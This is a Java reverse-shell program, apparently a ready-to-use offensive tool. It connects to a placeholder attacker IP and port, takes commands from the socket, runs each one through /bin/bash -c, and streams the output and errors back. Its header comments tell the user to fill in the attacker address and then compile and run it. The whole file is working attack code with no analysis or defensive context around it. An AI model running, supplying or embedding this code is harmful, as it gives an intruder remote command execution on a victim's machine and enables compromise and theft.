//Change ATTACKER-IP-HERE and PORT-NUMBER-HERE
//Run: javac ReverseShell.java && java ReverseShell

import java.net.*;
import java.io.*;

class ReverseShell {
    public static void main(String[] args) {
        Socket socket;
        try
        {
            socket = new Socket("ATTACKER-IP-HERE", PORT-NUMBER-HERE);
            PrintWriter socketOut = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader socketIn = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            Runtime rt = Runtime.getRuntime();
            Process proc = null;
            BufferedReader cmdOut = null;
            BufferedReader cmdErr = null; 
            String line = null;
            String[] cmd = new String[3];
            cmd[0] = "/bin/bash";
            cmd[1] = "-c";
           
            while (true)
            {
                cmd[2] = socketIn.readLine();
                proc = rt.exec(cmd);
                cmdOut = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                cmdErr = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
                
                while((line = cmdOut.readLine()) != null)
                {
                    socketOut.write(line + "\n");
                    socketOut.flush();
                }                
                line = null;
                while((line = cmdErr.readLine()) != null)
                {
                    socketOut.write(line + "\n");
                    socketOut.flush();
                }
                line = null;
            }
        }
        catch (IOException e) {
            System.out.println(e);
        }
    }
}
